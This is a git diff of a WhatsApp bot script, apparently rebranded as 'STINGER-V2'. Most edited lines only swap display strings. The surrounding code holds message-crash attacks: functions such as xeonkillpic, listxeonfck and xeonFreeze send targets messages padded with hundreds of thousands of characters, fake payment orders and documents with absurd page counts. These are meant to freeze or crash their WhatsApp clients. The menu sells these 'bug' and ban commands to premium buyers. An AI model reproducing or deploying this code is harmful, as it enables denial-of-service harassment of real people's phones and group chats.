@@ -203,7 +203,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -245,7 +245,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `🦄드림 가이 Xeon`
+title: `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`
 }
 }
 }
@@ -277,7 +277,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
+    "caption": `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -291,7 +291,7 @@ async function xeonkillpic(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "🦄드림 가이 Xeon",
+        title: "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░",
         hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
       },
@@ -299,7 +299,7 @@ async function xeonkillpic(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #🦄드림 가이 Xeon"
+        text: "›          #░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -316,9 +316,9 @@ await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
 async function listxeonfck(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
-        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
-        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
+    'title': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░"+" ".repeat(920000),
+        'footerText': `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`,
+        'description': `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`,
         'buttonText': null,
         'listType': 2,
         'productListInfo': {
@@ -1438,7 +1438,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑😉👉09037524605`
+                let teks = `Wag wan ${pushname}👋\nWant to Buy Premium? Just chat with ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑😉👉09037524605`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
@@ -1510,7 +1510,7 @@ const repf = await XeonBotInc.sendMessage(from, {
 contacts: { 
 displayName: `${list.length} Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Hi ${pushname} . My  handsome owner is no other person than ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑,i just love that dude so much`, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `Wag wan @${sender.split("@")[0]}, My  handsome owner is no other person than ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑,i just love that dude so much`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
@@ -2391,7 +2391,7 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE✅ ES TEAMS HAS BEEN SENT TO THE GROUP!.*");
+      replygcxeon("*DONE✅ STINGER-V2 HAS BEEN SENT TO THE GROUP!.*");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
       replygcxeon(util.format(error));
@@ -2507,10 +2507,10 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 					const crasoh = await XeonBotInc.relayMessage(jid,
 						{
 							extendedTextMessage: {
-								text: '🦄드림 가이 Xeon',
+								text: '░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░',
 								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
 								canonicalUrl: 'https://example.com',
-								description: '🦄드림 가이 Xeon  🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
+								description: '░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░',
 								title: '🦄드림 가이 Xeon',
 								textArgb: 0xff000000,
 								backgroundArgb: 0xffffffff,
@@ -2583,7 +2583,7 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 											subtitle: ' ',
 										},
 										body: {
-											text: '🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
+											text: '░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░',
 										},
 										footer: {
 											text: 'xp',
@@ -2710,9 +2710,9 @@ async function xeonFreeze(jid){
 	  for (let i = 0; i < 50; i++) {
 await XeonBotInc.sendMessage(jid, {
     'document': XeonDoc,
-    'fileName': "🦄드림 가이 Xeon" + xeontext1,
+    'fileName': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░" + xeontext1,
     'mimetype': "application/zip",
-    'caption': "🦄드림 가이 Xeon" + xeontext1,
+    'caption': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░" + xeontext1,
     'pageCount': 0x3b9aca00,
     'contactVcard': true
 });
@@ -2725,7 +2725,7 @@ await xeonFreeze(m.chat);
 	case 'xkillgc': case 'xblankscrn': case 'xwebgc': {
 		if (!isPremium) return replygcxeon(mess.prem)
 		const xeonimage = {
-    title: "🦄드림 가이 Xeon; ",
+    title: "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░; ",
     hasMediaAttachment: true,
     imageMessage: thumb.imageMessage
 };
@@ -2744,7 +2744,7 @@ XeonBotInc.relayMessage(m.chat, {
                     'buttons': [{
                         'name': "galaxy_message",
                         'buttonParamsJson': JSON.stringify({
-                            'header': "🦄드림 가이 Xeon; ",
+                            'header': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░; ",
                             'body': "xxx",
                             'flow_action': "navigate",
                             'flow_action_payload': {
@@ -2776,7 +2776,7 @@ XeonBotInc.relayMessage(m.chat, {
                     'forwardedNewsletterMessageInfo': {
                         'newsletterJid': "120363222395675670@newsletter",
                         'serverMessageId': 0x1,
-                        'newsletterName': "🦄드림 가이 Xeon"
+                        'newsletterName': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░"
                     }
                 }
             }
@@ -2804,8 +2804,8 @@ title: `Xeon's ur father`
     {
       document: { url: "./settings.js" },
       mimetype: `image/null`,
-      fileName: `🦄드림 가이 Xeon${xeontext11}`,
-      caption: `🦄드림 가이 Xeon ${xeontext11}`,
+      fileName: `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░${xeontext11}`,
+      caption: `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░ ${xeontext11}`,
     },
     { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
   );
@@ -2887,19 +2887,14 @@ break
                 let xeonmenuoh = `
 ╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 2҉━━━━━━╮
 ┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ 🚀👽
-┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ 2.0.0 🔝💻
+┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ 2.1.0 🔝💻
 ┃❁️ _ᴍᴏᴅᴇʟ:_ ꜱᴛɪɴɢᴇʀ 🤖💸
 ┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
 ╰━━━━━━❄️◁️🕷️━━━━━━╯
 ╰⭑➤➤⭑➤➤⭑➤ ${xeonytimewisher} 😄
 ${readmore}
 ╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
-> 𝐱𝐚𝐧𝐝𝐫𝐢𝐨𝐝 ◁️❄️🕷️
-> 𝐱𝐚𝐧𝐝𝐫𝐢𝐨𝐝𝟐 ◁️❄️🕷️
-> 𝐬𝐲𝐬𝐭𝐞𝐦𝐮𝐢𝐜𝐫𝐚𝐬𝐡 ◁️❄️🕷️
-> 𝐱𝐬𝐲𝐬𝐮𝐢 ◁️❄️🕷️
 > 𝐱𝐩𝐚𝐲𝐦𝐞𝐧𝐭 ◁️❄️🕷️
-> 𝐨𝐧𝐞𝐬𝐡𝐨𝐭 ◁️❄️🕷️
 > 𝐨𝐧𝐞𝐤𝐢𝐥𝐥◁️❄️🕷️
 > 𝐱𝐟𝐫𝐞𝐞𝐳𝐞 ◁️❄️🕷️
 
@@ -2920,23 +2915,7 @@ ${readmore}
 > 𝐥𝐨𝐜𝐤𝐨𝐭𝐩 ◁️❄️🕷️
 
 ╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
-> 𝐰𝐞𝐛𝐠𝐜 ◁️❄️🕷️
-> 𝐚𝐧𝐝𝐫𝐨𝐠𝐜 ◁️❄️🕷️
-> 𝐢𝐨𝐬𝐠𝐜 ◁️❄️🕷️
-> 𝐱𝐣𝐩𝐦𝐠𝐜 ◁️❄️🕷️
-
-╰⭑➤➤⭑➤➤⭑➤ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ
-> 𝐛𝐚𝐧𝐯𝟏 ◁️❄️🕷️
-> 𝐛𝐚𝐧𝐯𝟐 ◁️❄️🕷️
-> 𝐛𝐚𝐧𝐯𝟑 ◁️❄️🕷️
-> 𝐛𝐚𝐧𝐯𝟒 ◁️❄️🕷️
-> 𝐛𝐚𝐧𝐯𝟓 ◁️❄️🕷️ 
-> 𝐛𝐚𝐧𝐯𝟔 ◁️❄️🕷️
-> 𝐮𝐧𝐛𝐚𝐧𝐯𝟏 ◁️❄️🕷️
-> 𝐮𝐧𝐛𝐚𝐧𝐯𝟐 ◁️❄️🕷️
-> 𝐮𝐧𝐛𝐚𝐧𝐯𝟑 ◁️❄️🕷️
-> 𝐮𝐧𝐛𝐚𝐧𝐯𝟒 ◁️❄️🕷️
-> 𝐮𝐧𝐛𝐚𝐧𝐯𝟒 ◁️❄️🕷️
+> 𝐱𝐰𝐞𝐛𝐠𝐜 ◁️❄️🕷️
 
 ╰⭑➤➤⭑➤➤⭑➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
 > 𝐠𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧 ◁️❄️🕷️
@@ -2994,7 +2973,6 @@ ${readmore}
 > 𝐭𝐨𝐦𝐩𝟑 ◁️❄️🕷️
 > 𝐭𝐨𝐯𝐧 ◁️❄️🕷️
 > 𝐭𝐨𝐠𝐢𝐟 ◁️❄️🕷️
-> 𝐭𝐨𝐮𝐫𝐥 ◁️❄️🕷️
 > 𝐭𝐨𝐪𝐫 ◁️❄️🕷️
 > 𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞 ◁️❄️🕷️
 > 𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭 ◁️❄️🕷️
